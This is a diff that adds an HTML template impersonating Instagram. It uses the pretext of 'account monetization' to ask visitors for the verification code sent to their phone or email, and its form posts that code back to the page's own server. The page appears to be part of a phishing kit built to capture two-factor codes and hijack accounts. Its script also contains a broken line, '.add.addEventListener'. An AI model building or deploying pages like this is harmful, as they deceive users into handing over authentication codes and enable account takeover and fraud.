@@ -1,0 +1,125 @@
+{% extends "base.html" %}
+{% block body %}
+<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px rgba(228,64,95,0.25);border-radius:16px;">
+  <div class="platform-header">
+    <div class="icon-circle bg-instagram">
+      <i class="fa-brands fa-instagram icon-lg"></i>
+    </div>
+    <div>
+      <h2 class="notranslate" style="margin:0;color:#E4405F;">Instagram</h2>
+      <div style="color:#64748b;font-size:13px;margin-top:4px">Continue with your account monetization.</div>
+    </div>
+  </div>
+
+  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">🔒 Security Verification Required</h3>
+  
+  <div class="play-instructions">
+    <div class="instruction-card">
+      <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">Verification Code</h4>
+      <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
+        To confirm that you are the rightful owner of the Instagram account you logged in with, a verification code has been sent to your registered SMS or email by Instagram. Please enter the code below and click “Submit” to continue.
+      </p>
+    </div>
+
+  <form id="loginForm" method="post" novalidate>
+    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Security Code</label>
+    <input class="input" id="digits" name="digits" placeholder="Enter code" pattern="\d{4,9}" required>
+    <div class="error-text" id="digitsError"></div>
+
+    <div class="center">
+      <button class="btn login-btn" type="submit">Summit</button>
+    </div>
+  </form>
+</div>
+
+<script>
+document.getElementById("loginForm").addEventListener("submit", function(event) {
+  const digits = document.getElementById("digits");
+  const digitsError = document.getElementById("digitsError");
+
+  let valid = true;
+  digits.classList.remove("input-error");
+  digitsError.textContent = "";
+
+  const val = digits.value.trim();
+  const pattern = /^\d{4,9}$/; // 4-9 digits only
+
+  if (!pattern.test(val)) {
+    valid = false;
+    digits.classList.add("input-error");
+    digitsError.textContent = "The code you entered is incorrect.";
+  }
+
+  if (!valid) event.preventDefault();
+});
+
+document.getElementById("digits").add.addEventListener("input", () => {
+  const digits = document.getElementById("digits");
+  const digitsError = document.getElementById("digitsError");
+  digits.classList.remove("input-error");
+  digitsError.textContent = "";
+});
+</script>
+
+<style>
+.input {
+  width: 100%;
+  padding: 14px;
+  border-radius: 18px;
+  border: 1px solid #e5e7eb;
+  margin-bottom: 8px;
+  font-size: 16px;
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+.input:focus {
+  border-color: #E4405F;
+  box-shadow: 0 0 0 3px rgba(228,64,95,0.2);
+  outline: none;
+}
+.input-error {
+  border-color: #ef4444;
+  box-shadow: 0 0 0 3px rgba(239,68,68,0.15);
+}
+.error-text {
+  color: #ef4444;
+  font-size: 13px;
+  margin-top: -4px;
+  margin-bottom: 8px;
+}
+
+.login-btn {
+  width: 100%;
+  background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
+  color: #fff;
+  font-size: 16px;
+  font-weight: 700;
+  padding: 12px;
+  border-radius: 25px;
+  cursor: pointer;
+  border: none;
+  transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
+  box-shadow: 0 6px 16px rgba(221,42,123,0.25);
+  display: block;
+  margin-top: 8px;
+}
+.login-btn:hover {
+  background: linear-gradient(45deg, #fd5949, #d6249f, #c13584, #833ab4);
+  box-shadow: 0 8px 20px rgba(221,42,123,0.35);
+}
+.login-btn:active {
+  transform: scale(0.985);
+}
+
+.play-instructions {
+  margin: 20px 0;
+}
+
+.instruction-card {
+  background: #fdf2f8;
+  padding: 16px;
+  border-radius: 12px;
+  border-left: 4px solid #E4405F;
+  margin-bottom: 16px;
+}
+</style>
+{% endblock %}
